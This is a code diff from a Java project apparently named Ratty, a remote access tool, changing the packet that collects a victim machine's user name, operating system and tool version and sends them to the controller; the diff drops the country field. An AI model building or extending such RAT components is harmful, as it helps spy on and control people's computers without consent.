@@ -5,11 +5,10 @@ import de.sogomn.rat.Ratty;
 
 public final class InformationPacket extends AbstractPingPongPacket {
 	
-	private String name, location, os, version;
+	private String name, os, version;
 	
 	public InformationPacket(final String name, final String location, final String os, final String version) {
 		this.name = name;
-		this.location = location;
 		this.os = os;
 		this.version = version;
 		
@@ -30,7 +29,6 @@ public final class InformationPacket extends AbstractPingPongPacket {
 	@Override
 	protected void sendData(final ActiveConnection connection) {
 		connection.writeUTF(name);
-		connection.writeUTF(location);
 		connection.writeUTF(os);
 		connection.writeUTF(version);
 	}
@@ -43,7 +41,6 @@ public final class InformationPacket extends AbstractPingPongPacket {
 	@Override
 	protected void receiveData(final ActiveConnection connection) {
 		name = connection.readUTF();
-		location = connection.readUTF();
 		os = connection.readUTF();
 		version = connection.readUTF();
 	}
@@ -52,7 +49,6 @@ public final class InformationPacket extends AbstractPingPongPacket {
 	protected void executeRequest(final ActiveConnection connection) {
 		type = DATA;
 		name = System.getProperty("user.name");
-		location = System.getProperty("user.country");
 		os = System.getProperty("os.name");
 		version = Ratty.VERSION;
 		
@@ -66,10 +62,6 @@ public final class InformationPacket extends AbstractPingPongPacket {
 	
 	public String getName() {
 		return name;
-	}
-	
-	public String getLocation() {
-		return location;
 	}
 	
 	public String getOs() {
